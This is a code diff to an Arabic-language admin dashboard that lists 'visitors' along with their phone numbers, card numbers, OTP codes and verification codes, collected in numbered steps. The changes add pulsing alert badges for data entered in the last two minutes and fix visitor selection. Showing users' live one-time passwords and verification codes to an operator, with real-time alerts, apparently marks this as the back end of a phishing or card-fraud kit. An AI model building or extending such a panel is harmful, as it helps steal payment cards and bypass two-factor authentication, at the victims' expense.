@@ -28,6 +28,33 @@
             background: #f9fafb;
         }
         
+        /* Notification Badge */
+        .notification-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #ef4444;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            animation: pulse-badge 2s infinite;
+        }
+        
+        @keyframes pulse-badge {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+        
         .visitor-card {
             transition: all 0.2s ease;
         }
@@ -281,8 +308,8 @@
                     <div class="visitor-card p-4 border-b border-gray-100 cursor-pointer ${selectedVisitor?.vid === v.vid ? 'selected' : ''}"
                          onclick="selectVisitor('${v.vid}')">
                         <div class="flex items-start gap-3">
-                            <div onclick="event.stopPropagation(); toggleSelect('${v.id}')" class="mt-1">
-                                <i data-lucide="${selectedIds.has(v.id) ? 'check-square' : 'square'}" class="w-5 h-5 ${selectedIds.has(v.id) ? 'text-green-600' : 'text-gray-400'}"></i>
+                            <div onclick="event.stopPropagation(); toggleSelect('${v.vid}')" class="mt-1">
+                                <i data-lucide="${selectedIds.has(v.vid) ? 'check-square' : 'square'}" class="w-5 h-5 ${selectedIds.has(v.vid) ? 'text-green-600' : 'text-gray-400'}"></i>
                             </div>
                             <div class="flex-1">
                                 <div class="flex items-center justify-between mb-1">
@@ -293,11 +320,14 @@
                                     ${v.data?.step5?.phone ? `<span>📞 ${v.data.step5.phone}</span>` : ''}
                                     ${v.data?.step4?.cardNumber ? `<span>💳 ****${v.data.step4.cardNumber.slice(-4)}</span>` : ''}
                                 </div>
-                                <div class="flex items-center gap-2">
+                                <div class="flex items-center gap-2 flex-wrap">
                                     <span class="online-dot ${v.isOnline ? 'online' : 'offline'}"></span>
                                     <span class="text-xs text-gray-600">${v.isOnline ? 'متصل' : 'غير متصل'}</span>
-                                    ${v.data?.step4?.cardNumber ? '<span class="px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">💳</span>' : ''}
-                                    ${v.otp?.current?.otp ? '<span class="px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">🔑</span>' : ''}
+                                    ${v.data?.step3 ? '<span class="relative px-2 py-0.5 bg-green-100 text-green-700 rounded text-xs">Step3${isRecent(v.data.step3.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
+                                    ${v.data?.step4 ? '<span class="relative px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">💳 Step4${isRecent(v.data.step4.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
+                                    ${v.data?.step5 ? '<span class="relative px-2 py-0.5 bg-orange-100 text-orange-700 rounded text-xs">📱 Step5${isRecent(v.data.step5.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
+                                    ${v.otp?.current?.otp ? '<span class="relative px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">🔑 OTP${isRecent(v.otp.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
+                                    ${v.verification?.current?.verificationCode ? '<span class="relative px-2 py-0.5 bg-pink-100 text-pink-700 rounded text-xs">✔️ Verify${isRecent(v.verification.current.timestamp) ? '<span class="notification-badge">!</span>' : ''}</span>' : ''}
                                 </div>
                             </div>
                         </div>
@@ -309,8 +339,8 @@
         }
         
         // Select visitor
-        function selectVisitor(id) {
-            selectedVisitor = visitors.find(v => v.id === id);
+        function selectVisitor(vid) {
+            selectedVisitor = visitors.find(v => v.vid === vid);
             renderVisitorList();
             renderDetails();
         }
@@ -410,11 +440,11 @@
         }
         
         // Toggle select
-        function toggleSelect(id) {
-            if (selectedIds.has(id)) {
-                selectedIds.delete(id);
+        function toggleSelect(vid) {
+            if (selectedIds.has(vid)) {
+                selectedIds.delete(vid);
             } else {
-                selectedIds.add(id);
+                selectedIds.add(vid);
             }
             updateSelectUI();
             renderVisitorList();
@@ -425,7 +455,7 @@
             if (selectedIds.size === visitors.length) {
                 selectedIds.clear();
             } else {
-                selectedIds = new Set(visitors.map(v => v.id));
+                selectedIds = new Set(visitors.map(v => v.vid));
             }
             updateSelectUI();
             renderVisitorList();
@@ -478,6 +508,15 @@
             if (diff < 3600) return `منذ ${Math.floor(diff / 60)} دقيقة`;
             if (diff < 86400) return `منذ ${Math.floor(diff / 3600)} ساعة`;
             return `منذ ${Math.floor(diff / 86400)} يوم`;
+        }
+        
+        // Check if data is recent (within last 2 minutes)
+        function isRecent(timestamp) {
+            if (!timestamp) return false;
+            const now = new Date();
+            const then = new Date(timestamp);
+            const diff = Math.floor((now - then) / 1000);
+            return diff < 120; // 2 minutes
         }
         
         // Logout
